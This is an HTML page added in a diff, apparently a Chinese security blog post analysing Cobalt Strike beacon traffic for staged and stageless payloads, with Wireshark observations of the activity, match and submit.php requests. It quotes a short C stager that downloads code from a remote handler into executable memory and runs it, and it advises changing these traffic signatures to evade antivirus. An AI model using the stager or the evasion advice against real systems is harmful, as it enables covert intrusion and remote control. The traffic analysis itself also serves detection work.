@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="cn">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cangqingzhe.github.io","root":"/","scheme":"Muse","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="​        之前我们了解了关于cobaltstrike shell生成的过程，接下来我们一起了解一下cobaltstrike的stager具体是如何工作的，它在目标主机执行后是如何和我们的服务端进行通信的。 基本概念​        在我们分析cobaltstrike的通信过程之前，首先需要了解cobaltstrike的一些基本概念 Staged Payloads ​        执行pa">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于cobaltstrike通信流程的分析">
+<meta property="og:url" content="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="藏青&#39;s BLOG">
+<meta property="og:description" content="​        之前我们了解了关于cobaltstrike shell生成的过程，接下来我们一起了解一下cobaltstrike的stager具体是如何工作的，它在目标主机执行后是如何和我们的服务端进行通信的。 基本概念​        在我们分析cobaltstrike的通信过程之前，首先需要了解cobaltstrike的一些基本概念 Staged Payloads ​        执行pa">
+<meta property="og:locale" content="cn">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182559711.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182724592.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901193704075.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194454763.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194558581.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901195732678.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200101283.png">
+<meta property="og:image" content="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200145700.png">
+<meta property="article:published_time" content="2020-09-01T08:15:43.000Z">
+<meta property="article:modified_time" content="2020-09-01T12:16:33.273Z">
+<meta property="article:author" content="藏青">
+<meta property="article:tag" content="CobaltStrike">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182559711.png">
+
+<link rel="canonical" href="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>关于cobaltstrike通信流程的分析 | 藏青's BLOG</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">藏青's BLOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于cobaltstrike通信流程的分析
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-09-01 16:15:43 / Modified: 20:16:33" itemprop="dateCreated datePublished" datetime="2020-09-01T16:15:43+08:00">2020-09-01</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>​        之前我们了解了关于cobaltstrike shell生成的过程，接下来我们一起了解一下cobaltstrike的stager具体是如何工作的，它在目标主机执行后是如何和我们的服务端进行通信的。</p>
+<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>​        在我们分析cobaltstrike的通信过程之前，首先需要了解cobaltstrike的一些基本概念</p>
+<p><strong>Staged Payloads</strong></p>
+<p>​        执行payload的方式分为两种，一种是分阶段加载（Staged）和不分阶段加载（STAGELESS ）。当使用分阶段加载的方式时，一般把程序分为两个部分，stager和stage，stager通常是一个代码量非常小的精简过的汇编代码，它的作用非常简单，就是用来下载stage并载入到内存,也就是主要完成下载远程的stage文件和分配内存将stage加载到内存并执行的功能。在cobaltstrike的官方博客中，给出了一个简单的stager的代码,主要通过C语言实现，通过wsconnect来和远程的地址建立socket通信，下载远程的文件分配内存并载入到内存，最后通过函数指针的形式来进行调用。之所以这么做主要是为了解决payload大小限制的问题。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* connect to the handler *&#x2F;</span><br><span class="line">SOCKET my_socket &#x3D; wsconnect(argv[1], atoi(argv[2]));</span><br><span class="line"> </span><br><span class="line">&#x2F;* read the 4-byte length *&#x2F;</span><br><span class="line">int count &#x3D; recv(my_socket, (char *)&amp;size, 4, 0);</span><br><span class="line">if (count !&#x3D; 4 || size &lt;&#x3D; 0)     punt(my_socket, &quot;read a strange or incomplete length value\n&quot;); &#x2F;* allocate a RWX buffer *&#x2F; buffer &#x3D; VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (buffer &#x3D;&#x3D; NULL)     punt(my_socket, &quot;could not allocate buffer\n&quot;); &#x2F;* prepend a little assembly to move our SOCKET value to the EDI register    thanks mihi for pointing this out    BF 78 56 34 12     &#x3D;&gt;      mov edi, 0x12345678 *&#x2F;</span><br><span class="line">buffer[0] &#x3D; 0xBF;</span><br><span class="line"> </span><br><span class="line">&#x2F;* copy the value of our socket to the buffer *&#x2F;</span><br><span class="line">memcpy(buffer + 1, &amp;my_socket, 4);</span><br><span class="line"> </span><br><span class="line">&#x2F;* read bytes into the buffer *&#x2F;</span><br><span class="line">count &#x3D; recv_all(my_socket, buffer + 5, size);</span><br><span class="line"> </span><br><span class="line">&#x2F;* cast our buffer as a function and call it *&#x2F;</span><br><span class="line">function &#x3D; (void (*)())buffer;</span><br><span class="line">function();</span><br></pre></td></tr></table></figure>
+
+<p>​        我们再了解一下为什么要使用分阶段的方式呢？根据作者的描述有以下几点</p>
+<ul>
+<li>为了解决文件文件大小的问题，另一方面为了和Metasploit兼容</li>
+<li>通常stager作为一个加载器并没有做安全处理，而stage则会做比较好的处理，一般如果别人捕获了stager样本并不会造成什么影响。所以使用分阶段的形式也是为了保护stage</li>
+</ul>
+<p><strong>stageless payload</strong></p>
+<p>​        stageless payload顾名思义就是无阶段payload,那么既然我们已经介绍了关于使用分阶段执行payload的好处，为什么还要再去使用无阶段执行payload呢？原因是在内网横向渗透的过程中，因为目标内网的主机可能无法和外网通信，这个时候如果还使用分阶段执行，目标内网的断网机将无法下载到stage。所以在内网渗透的过程中一般使用的是无阶段的payload。</p>
+<p><strong>beacon</strong></p>
+<p>​        beacon运行在目标主机的用于远程控制的payload，主要用来实现稳定控制目标的功能，并不会实时和cobaltstrike服务端通信，在一段时间后会去检测是否有任务，如果有任务，beacon就会下载任务并且执行。当存在任务时，beacon一般会通过http去输出请求结果，可以通过http或者dns来检查是否有任务。</p>
+<h3 id="beacon通信分析"><a href="#beacon通信分析" class="headerlink" title="beacon通信分析"></a>beacon通信分析</h3><h4 id="staged-payload"><a href="#staged-payload" class="headerlink" title="staged payload"></a>staged payload</h4><p>​        我使用wireshark进行分析，当我执行cobaltstrike生成的分阶段执行的payload时，首先会发起一个http请求，他会请求我们建立的listener端口，返回一个很大的内容</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182559711.png" alt="image-20200901182559711"></p>
+<p>​        这个请求我们也可以在web日志中查看到</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901182724592.png" alt="image-20200901182724592"></p>
+<p>​        通过我们之前对分阶段执行payload的了解，我们可以知道这个是去请求stage的请求，我手工请求了以下这个地址，并且将下载后的文件保存为dll文件，将这个dll文件和beacon.dll文件进行对比，发现这两个文件大小基本一致，因此基本可以确定这个请求的开始是加载了beacon.dll这个文件。</p>
+<p>​        继续看其他请求包，我们发现当通过get请求activity这个路径，会刷新beacon的时间。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901193704075.png" alt="image-20200901193704075"></p>
+<p>​        我尝试在和beacon进行交互，执行一个ipconfig命令，再抓包进行分析，当要执行命令时，我们可以看到当去请求activity这个路径时，已经有了返回内容</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194454763.png" alt="image-20200901194454763"></p>
+<p>​        我们再看下一个包， 可以看到beacon向服务端发起一个post请求，路径为submit.php，并且带有id参数，请求内容为加密后的内容。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901194558581.png" alt="image-20200901194558581"></p>
+<p>​        我尝试进行文件操作，发现传输返回结果还是通过向服务端以post形式请求submit.php。所以看到这里大家知道为什么我们明明免杀都过了，一执行就会被360干掉了，我如果是360，我也知道看有没有通过请求active和submit提交一些加密代码来判断是不是cs的shell了，所以做免杀的时候一定要去改流量特征。</p>
+<h4 id="stageless-payload"><a href="#stageless-payload" class="headerlink" title="stageless payload"></a>stageless payload</h4><p>​        我们再生成一个无阶段的payload执行，再看看通信的流程。</p>
+<p>​        当我执行生成的无阶段的payload时，我发现并没有发送其他包，而是只发送了一个get请求请求match这个路径。当请求了match这个路径，服务端的延时就会刷新一次，所以我们知道这个请求是获取服务端执行命令的请求。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901195732678.png" alt="image-20200901195732678"></p>
+<p>​        当我们执行ipconfig这个命令后，通过抓包分析，我们发现match会返回一个结果，这个就是需要执行的命令。</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200101283.png" alt="image-20200901200101283"></p>
+<p>​        再看这个请求的下一个数据包，会去请求submit.php，去传递命令执行的结果</p>
+<p><img src="/2020/09/01/%E5%85%B3%E4%BA%8Ecobaltstrike%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90/image-20200901200145700.png" alt="image-20200901200145700"></p>
+<p>​        所以我们可以知道再cobaltstrike4.0中，如果使用无阶段的payload放到目标主机执行，会在请求过程中发送大量请求match和submit.php的数据包，这个就可以当作一个流量特征来进行处理。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过关于beacon的流量分析，我们应该了解了关于beacon通信和加载的方式，也应该明白了为什么我们使用CobaltStrike一定要改流量特征了吧。</p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/" target="_blank" rel="noopener">Staged Payloads – What Pen Testers Should Know</a></p>
+<p><a href="https://blog.cobaltstrike.com/2016/06/15/what-is-a-stageless-payload-artifact/" target="_blank" rel="noopener">What is a stageless payload artifact?</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CobaltStrike/" rel="tag"># CobaltStrike</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/08/31/%E5%85%B3%E4%BA%8ECobaltStrike%E7%94%9F%E6%88%90shell%E7%9A%84%E8%BF%87%E7%A8%8B%E5%92%8C%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B%E7%9A%84%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/" rel="prev" title="关于CobaltStrike生成shell的过程和执行流程的分析学习">
+      <i class="fa fa-chevron-left"></i> 关于CobaltStrike生成shell的过程和执行流程的分析学习
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本概念"><span class="nav-number">1.</span> <span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#beacon通信分析"><span class="nav-number">2.</span> <span class="nav-text">beacon通信分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#staged-payload"><span class="nav-number">2.1.</span> <span class="nav-text">staged payload</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#stageless-payload"><span class="nav-number">2.2.</span> <span class="nav-text">stageless payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">藏青</p>
+  <div class="site-description" itemprop="description">知行合一</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">藏青</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
+  </div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
